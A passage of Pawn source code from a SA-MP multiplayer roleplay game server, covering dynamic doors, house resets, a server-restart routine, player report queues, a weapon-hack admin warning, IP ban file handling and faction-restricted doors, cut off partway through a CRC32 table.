			DDoorsInfo[iIndex][ddCustomInterior],
			DDoorsInfo[iIndex][ddExteriorVW],
			DDoorsInfo[iIndex][ddExteriorInt],
			DDoorsInfo[iIndex][ddInteriorVW],
			DDoorsInfo[iIndex][ddInteriorInt],
			DDoorsInfo[iIndex][ddExteriorX],
			DDoorsInfo[iIndex][ddExteriorY],
			DDoorsInfo[iIndex][ddExteriorZ],
			DDoorsInfo[iIndex][ddExteriorA],
			DDoorsInfo[iIndex][ddInteriorX],
			DDoorsInfo[iIndex][ddInteriorY],
			DDoorsInfo[iIndex][ddInteriorZ],
			DDoorsInfo[iIndex][ddInteriorA],
			DDoorsInfo[iIndex][ddCustomExterior],
			DDoorsInfo[iIndex][ddVIP],
	  		DDoorsInfo[iIndex][ddGang],
	  		DDoorsInfo[iIndex][ddFaction],
	  		DDoorsInfo[iIndex][ddAdmin],
	  		DDoorsInfo[iIndex][ddWanted],
	  		DDoorsInfo[iIndex][ddVehicleAble],
	  		DDoorsInfo[iIndex][ddColor],
	  		DDoorsInfo[iIndex][ddPickupModel],
	  		DDoorsInfo[iIndex][ddPass],
	  		DDoorsInfo[iIndex][ddLocked],
	  		DDoorsInfo[iIndex][ddNotEditable]
		);
		fwrite(fHandle, szFileStr);
	}
	return fclose(fHandle);
}

stock CreateDynamicDoor(doorid)
{
	new string[128];
	//format(string, sizeof(string), "%s\nID: %d",DDoorsInfo[doorid][ddDescription],doorid);
	format(string, sizeof(string), "%s",DDoorsInfo[doorid][ddDescription]);

	switch(DDoorsInfo[doorid][ddColor])
	{
	    case -1:{ /* Disable 3d Textdraw */ }
	    case 1:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWWHITE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 2:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWPINK, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 3:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWRED, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 4:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWBROWN, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 5:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWGRAY, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 6:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWOLIVE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 7:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWPURPLE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 8:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWORANGE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 9:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWAZURE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 10:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWGREEN, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 11:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWBLUE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 12:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWBLACK, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
		default:
		{
			DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_YELLOW, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);
		}
	}

	switch(DDoorsInfo[doorid][ddPickupModel])
	{
	    case -1: { /* Disable Pickup */ }
		case 1:
		{
			{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1210, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		}
		case 2: {DDoorsInfo[doorid][ddPickupID] = CreatePickup(1212, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 3:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1239, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 4:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1240, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 5:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1241, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 6:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1242, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 7:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1247, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 8:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1248, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 9:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1252, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 10:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1253, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 11:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1254, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 12:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1313, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 13:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1272, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 14:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1273, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 15:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1274, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 16:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1275, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 17:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1276, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 18:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1277, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 19:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1279, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 20:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1314, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 21:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1316, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 22:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1317, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 23:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1559, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 24:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(1582, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
		case 25:{DDoorsInfo[doorid][ddPickupID] = CreatePickup(2894, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);}
	    default:
	    {
			DDoorsInfo[doorid][ddPickupID] = CreatePickup(1318, 23, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ], DDoorsInfo[doorid][ddExteriorVW]);
		}
	}
}

stock ClearHouse(houseid)
{
	HouseInfo[houseid][hOwned] = 0;
	HouseInfo[houseid][hSafeMoney] = 0;
	HouseInfo[houseid][hPot] = 0;
	HouseInfo[houseid][hCrack] = 0;
	HouseInfo[houseid][hMaterials] = 0;
	HouseInfo[houseid][hWeapons][0] = 0;
	HouseInfo[houseid][hWeapons][1] = 0;
	HouseInfo[houseid][hWeapons][2] = 0;
	HouseInfo[houseid][hWeapons][3] = 0;
	HouseInfo[houseid][hWeapons][4] = 0;
	HouseInfo[houseid][hGLUpgrade] = 1;
}

stock ResetPlayerCash(playerid)
{
	PlayerInfo[playerid][pCash] = 0;
	ResetPlayerMoney(playerid);
	return 1;
}

SetFamilySkin(playerid, skinid)
{
	new gang;
	new skin;
	gang = PlayerInfo[playerid][pGang];
	skin = FamilyInfo[gang][FamilySkins][skinid];
	if(skin==0) return 1;
	PlayerInfo[playerid][pSkin] = skin;
	SetPlayerSkin(playerid, skin);
	return 1;
}

stock Random(min, max)
{
    new a = random(max - min) + min;
    return a;
}

forward ServerRestart();
public ServerRestart()
{
	//new string[128];
    ABroadCast(COLOR_YELLOW, "{AA3333}Server restart{FFFF00}: Freezing Accounts...", 5);

    foreach(Player, i) {
        TogglePlayerControllable(i, false);
    }

    foreach(Player, i)
	{
	    GameTextForPlayer(i, "~w~Server restarting...", 5000, 5);
	}

    ABroadCast(COLOR_YELLOW, "{AA3333}Server restart{FFFF00}: Force Saving Houses...", 5);
	SaveHouses();
	ABroadCast(COLOR_YELLOW, "{AA3333}Server restart{FFFF00}: Force Saving Dynamic Doors...", 5);
	SaveDynamicDoors();
	ABroadCast(COLOR_YELLOW, "{AA3333}Server restart{FFFF00}: Force Saving Map Icons...", 5);
	SaveDynamicMapIcons();
	ABroadCast(COLOR_YELLOW, "{AA3333}Server restart{FFFF00}: Force Saving Server Configuration", 5);
    Misc_Save();

	ABroadCast(COLOR_YELLOW, "{AA3333}Server restart{FFFF00}: Streamer Plugin Shutting Down...", 5);
	DestroyAllDynamicObjects();
	DestroyAllDynamicPickups();
	DestroyAllDynamic3DTextLabels();
	DestroyAllDynamicCPs();
	DestroyAllDynamicMapIcons();
	DestroyAllDynamicRaceCPs();
	DestroyAllDynamicAreas();

    ABroadCast(COLOR_YELLOW, "{AA3333}Server restart{FFFF00}: Force Saving Accounts...", 5);

	foreach(Player, i)
	{
	    GameTextForPlayer(i, "~w~Server restarting...", 5000, 5);
		DisablePlayerCheckpoint(i);
		gPlayerCheckpointStatus[i] = CHECKPOINT_NONE;
		for(new s = 0; s < 12; s++)
		{
			if(PlayerInfo[i][pAGuns][s] != 0)
			{
				RemovePlayerWeapon(i, PlayerInfo[i][pAGuns][s]);
			}
		}
		PlayerInfo[i][pInt] = GetPlayerInterior(i);
		if(GetPVarType(i, "tabbedVW") != 0) {
			PlayerInfo[i][pVW] = GetPVarInt(i, "tabbedVW");
		} else PlayerInfo[i][pVW] = GetPlayerVirtualWorld(i);

  		GetPlayerIp(i, PlayerInfo[i][pIP], 32);
		GetPlayerPos(i, PlayerInfo[i][pPos_x], PlayerInfo[i][pPos_y], PlayerInfo[i][pPos_z]);
		GetPlayerFacingAngle(i, PlayerInfo[i][pPos_r]);
		OnPlayerStatsUpdate(i);

		ResetPlayerWeapons(i);
	}

	SetTimer("FinishServerRestart", 10000, false);

	return 1;
}

forward FinishServerRestart();
public FinishServerRestart()
{
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* The server is now restarting. Please /quit and relog.");

    foreach(Player, i) {
	    Kick(i);
	}

	SendRconCommand("exit");
	return 1;
}

stock SendBugReportToQueue(reportfrom, report[])
{
    new bool:breakingloop = false, newid = INVALID_REPORT_ID;

	for(new i=0;i<MAX_REPORTS;i++)
	{
		if(!breakingloop)
		{
			if(Reports[i][HasBeenUsed] == 0)
			{
				breakingloop = true;
				newid = i;
			}
		}
    }
    if(newid != INVALID_REPORT_ID)
    {
        strmid(Reports[newid][Report], report, 0, strlen(report), 128);
        Reports[newid][ReportFrom] = reportfrom;
        Reports[newid][TimeToExpire] = 99999;
        Reports[newid][HasBeenUsed] = 1;
        Reports[newid][BeingUsed] = 1;
        Reports[newid][BugReport] = 1;
        Reports[newid][ReportExpireTimer] = SetTimerEx("ReportTimer", 60000, 0, "d", newid);
        new string[128];
        format(string, sizeof(string), "BUG: [%i] %s (BID: %i): %s", reportfrom, GetPlayerNameEx(reportfrom), newid, (report));
        ABroadCast(0xFF8000FF, string, 1);
    }
    else
    {
        ClearReports();
        SendReportToQueue(reportfrom, report);
    }
}

stock SendReportToQueue(reportfrom, report[])
{
    new bool:breakingloop = false, newid = INVALID_REPORT_ID;

	for(new i=0;i<MAX_REPORTS;i++)
	{
		if(!breakingloop)
		{
			if(Reports[i][HasBeenUsed] == 0)
			{
				breakingloop = true;
				newid = i;
			}
		}
    }
    if(newid != INVALID_REPORT_ID)
    {
        strmid(Reports[newid][Report], report, 0, strlen(report), 128);
        Reports[newid][ReportFrom] = reportfrom;
        Reports[newid][TimeToExpire] = 5;
        Reports[newid][HasBeenUsed] = 1;
        Reports[newid][BeingUsed] = 1;
        Reports[newid][ReportExpireTimer] = SetTimerEx("ReportTimer", 60000, 0, "d", newid);
        new string[128];
        format(string, sizeof(string), "Report from [%i] %s (RID: %i): %s", reportfrom, GetPlayerNameEx(reportfrom), newid, (report));
        ABroadCast(COLOR_REPORT,string,1);
    }
    else
    {
        ClearReports();
        SendReportToQueue(reportfrom, report);
    }
}

stock ClearReports()
{
	for(new i=0;i<MAX_REPORTS;i++)
	{
		strmid(Reports[i][Report], "None", 0, 4, 4);
		Reports[i][CheckingReport] = 999;
        Reports[i][ReportFrom] = 999;
        Reports[i][TimeToExpire] = 5;
        Reports[i][HasBeenUsed] = 0;
        Reports[i][BeingUsed] = 0;
        Reports[i][BugReport] = 0;
	}
	return 1;
}

stock ClearChatbox(playerid)
{
	for(new i = 0; i < 50; i++) {
		SendClientMessage(playerid, COLOR_WHITE, "");
	}
	return 1;
}

stock PlayerFacePlayer(playerid, targetplayerid)
{
	new Float: Angle;
	GetPlayerFacingAngle(playerid, Angle);
	SetPlayerFacingAngle(targetplayerid, Angle+180);
	return true;
}

stock GivePlayerEventWeapons(playerid)
{
	if(GetPVarInt(playerid, "EventToken") == 1)
	{
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][0], 60000);
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][1], 60000);
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][2], 60000);
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][3], 60000);
		GivePlayerWeapon(playerid, EventInfo[EventWeapons][4], 60000);
	}
	return 1;
}

stock ScoreUpdate()
{
	new LevScore;
	foreach(Player, i)
	{
   		LevScore = PlayerInfo[i][pLevel];
		SetPlayerScore(i, LevScore);
	}
	return 1;
}

stock ExecuteHackerAction(playerid, weaponid)
{
	if(!gPlayerLogged[playerid]) { return 1; }
	if(PlayerInfo[playerid][pTut] == 0) { return 1; } // NOT IMPLEMENTED YET
	if(playerTabbed[playerid] == 1) { return 1; }
	if(GetPVarInt(playerid, "PBM") > 0) { return 1; }

	new String[128], WeaponName[128];
	GetWeaponName(weaponid, WeaponName, sizeof(WeaponName));

	format(String, sizeof(String), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) may possibly be weapon hacking (%s).", GetPlayerNameEx(playerid), playerid, WeaponName);
	ABroadCast(COLOR_YELLOW, String, 2);

	SetPVarInt(playerid, "wpH", GetPVarInt(playerid, "wpH")+1);

	if(GetPVarInt(playerid, "wpH") >= 3) {
		format(String, sizeof(String), "%s may possibly be weapon hacking (%s).", GetPlayerNameEx(playerid), WeaponName);
		AddAutomatedFlag(playerid, String);
	}

	//format(String, sizeof(String), "%s (ID %d) may possibly be weapon hacking (%s)", GetPlayerNameEx(playerid), playerid, WeaponName);
	//Log("logs/hack.log", String);
	return 1;
}

stock IsValidIP(ip[])
{
    new a;
	for (new i = 0; i < strlen(ip); i++)
	{
		if(ip[i] == '.')
		{
		    a++;
		}
	}
	if(a != 3)
	{
	    return 1;
	}
	return 0;
}

stock fcreate(filename[])
{
	if(fexist(filename)) return false;
	new File:fhnd;
	fhnd=fopen(filename,io_write);
	if(fhnd) {
		fclose(fhnd);
		return true;
	}
	return false;
}

stock CheckBan(ip[])
{
	new string[20];
    new File: file = fopen("ban.cfg", io_read);
	while(fread(file, string))
	{
	    if(strcmp(ip, string, true, strlen(ip)) == 0)
	    {
	        fclose(file);
	        return 1;
	    }
	}
	fclose(file);
	return 0;
}

stock AddBan(ip[])
{
	if(CheckBan(ip) == 0)
	{
		new File: file = fopen("ban.cfg", io_append);
		new string[20];
		format(string, sizeof(string), "\n%s", ip);
	 	fwrite(file, string);
	 	fclose(file);
	 	foreach(Player, playerid)
		{
		    new playerIP[16];
			GetPlayerIp(playerid, playerIP, sizeof(playerIP));
			if(strcmp(playerIP, ip) == 0)
			{
	            SendClientMessage(playerid, COLOR_NEWS, "You're banned from Next Generation Gaming. You can appeal your ban on Discord");
				Kick(playerid);
			}
		}
		return 1;
	}
	return 0;
}

stock RemoveBan(ip[])
{
    if(CheckBan(ip) == 1)
	{
	    new string[20];
		new File: file = fopen("ban.cfg", io_read);
		fcreate("tempBan.cfg");
		new File: file2 = fopen("tempBan.cfg", io_append);
		while(fread(file, string))
		{
			if(strcmp(ip, string, true, strlen(ip)) != 0 && strcmp("\n", string) != 0)
		    {
				fwrite(file2, string);
			}
		}
		fclose(file);
		fclose(file2);
		file = fopen("ban.cfg", io_write);
		file2 = fopen("tempBan.cfg", io_read);
		while(fread(file2, string))
		{
			fwrite(file, string);
		}
		fclose(file);
		fclose(file2);
		fremove("tempBan.cfg");
		return 1;
    }
	return 0;
}

stock GetPlayerNameExEx(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	return name;
}

public OnPlayerPressButton(playerid, buttonid)
{
	// LSPD
   	if(buttonid == lspdcopsonly)
    {
	    if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 5)
		{
				DoorOpen(playerid);
				SetTimer("DoorClose", 4000, 0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   You're not a Cop / FBI!");
		}

	}
   	if(buttonid == lspdeveryone)
    {

		DoorOpen(playerid);
		SetTimer("DoorClose", 3500, 0);

	}

	// FBI
	if(buttonid == FBILobbyLeftBTN[0] || buttonid == FBILobbyLeftBTN[1])
	{
	    if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 5)
	    {
	        MoveDynamicObject(FBILobbyLeft,293.93002319,-1498.43457031,-46.13965225,4);
			SetTimer("CloseFBILobbyLeft", 2500, 0);
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_GREY,"Access denied.");
			return 1;
		}
	}
	if(buttonid == FBILobbyRightBTN[0] || buttonid == FBILobbyRightBTN[1])
	{
	    if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 5)
	    {
	        MoveDynamicObject(FBILobbyRight,303.84756470,-1521.62988281,-46.13965225,4);
			SetTimer("CloseFBILobbyRight", 2500, 0);
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_GREY,"Access denied.");
			return 1;
		}
	}
	if(buttonid == FBIPrivateBTN[0] || buttonid == FBIPrivateBTN[1])
	{
	    if((PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2) && PlayerInfo[playerid][pRank] >= 5 || PlayerInfo[playerid][pFaction] == 5)
	    {
	        MoveDynamicObject(FBIPrivate[0],299.29986572,-1491.75842285,-28.73300552,4);
	        MoveDynamicObject(FBIPrivate[1],299.33737183,-1496.86145020,-28.73300552,4);
			SetTimer("CloseFBIPrivate", 2500, 0);
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_GREY,"Access denied.");
			return 1;
		}
	}
	return false;
}

forward DoorOpen(playerid);
public DoorOpen(playerid)
{
	MoveDynamicObject(lspddoor1, 247.2763671875,72.536186218262,1002.640625, 3.5000);
 	MoveDynamicObject(lspddoor2, 244.0330657959,72.580932617188,1002.640625, 3.5000);
  	return 1;
}

forward DoorClose(playerid);
public DoorClose(playerid)
{
	MoveDynamicObject(lspddoor1, 246.35150146484,72.547714233398,1002.640625, 3.5000);
 	MoveDynamicObject(lspddoor2, 245.03300476074,72.568511962891,1002.640625, 3.5000);
  	return 1;
}

forward CloseFBILobbyLeft();
public CloseFBILobbyLeft()
{
	MoveDynamicObject(FBILobbyLeft,295.40136719,-1498.43457031,-46.13965225,4);
	return 1;
}

forward CloseFBILobbyRight();
public CloseFBILobbyRight()
{
	MoveDynamicObject(FBILobbyRight,302.39355469,-1521.62988281,-46.13965225,4);
	return 1;
}

forward CloseFBIPrivate();
public CloseFBIPrivate()
{
	MoveDynamicObject(FBIPrivate[0],299.29986572,-1492.82666016,-28.73300552,4);
	MoveDynamicObject(FBIPrivate[1],299.33737183,-1495.83911133,-28.73300552,4);
	return 1;
}

stock crc32(string[])
{
	new crc_table[256] = {
			0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535,
			0x9E6495A3, 0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD,
			0xE7B82D07, 0x90BF1D91, 0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D,
			0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC,
			0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4,
			0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B, 0x35B5A8FA, 0x42B2986C,
			0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 0x26D930AC,
			0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
			0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB,
			0xB6662D3D, 0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F,
			0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB,
			0x086D3D2D, 0x91646C97, 0xE6635C01, 0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E,
			0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA,
			0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65, 0x4DB26158, 0x3AB551CE,
			0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A,
			0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
			0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409,
			0xCE61E49F, 0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81,
			0xB7BD5C3B, 0xC0BA6CAD, 0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739,
